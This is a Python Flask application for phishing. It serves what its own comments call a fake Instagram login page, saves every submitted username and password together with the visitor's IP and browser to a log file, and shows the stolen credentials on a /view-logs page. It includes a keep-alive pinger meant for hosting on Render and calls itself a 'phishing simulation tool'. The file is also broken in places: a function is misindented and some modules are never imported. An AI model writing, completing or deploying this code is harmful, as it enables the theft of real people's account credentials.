from flask import Flask, request, render_template, redirect, url_for
import datetime
import os

app = Flask(__name__)

LOG_FILE = "captured_creds.txt"

def log_credentials(username, password, ip, user_agent):
    """Save captured credentials to a file"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"[{timestamp}]\n"
        f"  IP Address: {ip}\n"
        f"  Browser: {user_agent}\n"
        f"  Username/Email: {username}\n"
        f"  Password: {password}\n"
        f"{'='*50}\n"
    )
    with open(LOG_FILE, "a") as f:
        f.write(entry)

    print("\n" + "="*50)
    print("  🔴 CREDENTIALS CAPTURED!")
    print(f"  Username: {username}")
    print(f"  Password: {password}")
    print(f"  Time: {timestamp}")
    print("="*50 + "\n")

@app.route("/")
def home():
    """Show the fake Instagram login page"""
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def capture_login():
    """Capture credentials when form is submitted"""
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = request.remote_addr or "Unknown"
    user_agent = request.headers.get("User-Agent", "Unknown")

    log_credentials(username, password, ip, user_agent)

    return redirect(url_for("congratulations", username=username))

@app.route("/congratulations")
def congratulations():
    """Show the congratulations page"""
    username = request.args.get("username", "User")
    return render_template("congratulations.html", username=username)

@app.route("/view-logs")
def view_logs():
    """View captured credentials in browser"""
    if not os.path.exists(LOG_FILE):
        return """
        <html>
        <head><title>Captured Credentials</title></head>
        <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;">
            <h1 style="color:#ff4444;">📁 Captured Credentials</h1>
            <p>No credentials captured yet.</p>
            <p><a href="/" style="color:#00ff00;">Go to login page</a></p>
        </body>
        </html>
        """

    with open(LOG_FILE, "r") as f:
        content = f.read()

    return f"""
    <html>
    <head><title>Captured Credentials</title></head>
    <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;">
        <h1 style="color:#ff4444;">📁 Captured Credentials</h1>
        <pre>{content}</pre>
        <p><a href="/clear-logs" style="color:#ff4444;">Clear All Logs</a> |
        <a href="/" style="color:#00ff00;">Go to login page</a></p>
    </body>
    </html>
    """

@app.route("/clear-logs")
def clear_logs():
    """Delete all captured credentials"""
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return """
    <html>
    <head><title>Cleared</title></head>
    <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;">
        <h1>✅ All logs cleared</h1>
        <p><a href="/" style="color:#00ff00;">Go to login page</a></p>
    </body>
    </html>
    """
    def self_ping():
    """Ping own server every 10 minutes to prevent Render sleep"""
    while True:
        time.sleep(600)  # 10 minutes
        try:
            # Get the Render URL from environment or use localhost
            render_url = os.environ.get("RENDER_EXTERNAL_URL")
            if render_url:
                requests.get(f"{render_url}/health", timeout=10)
                print(f"[KEEP-ALIVE] Pinged {render_url}/health")
            else:
                # Fallback: ping localhost (works if running locally)
                port = int(os.environ.get("PORT", 5000))
                requests.get(f"http://localhost:{port}/health", timeout=10)
        except Exception as e:
            print(f"[KEEP-ALIVE] Ping failed: {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # THIS IS THE KEY FIX FOR RENDER
    print("*" * 50)
    print("  🚀 PHISHING SIMULATION TOOL STARTED")
    print(f"  📍 Login page: http://0.0.0.0:{port}")
    print("  📋 View logs:  http://0.0.0.0:{}/view-logs".format(port))
    print("  🛑 Press CTRL+C to stop the server")
    print("*" * 50)
    app.run(host="0.0.0.0", port=port, debug=False)
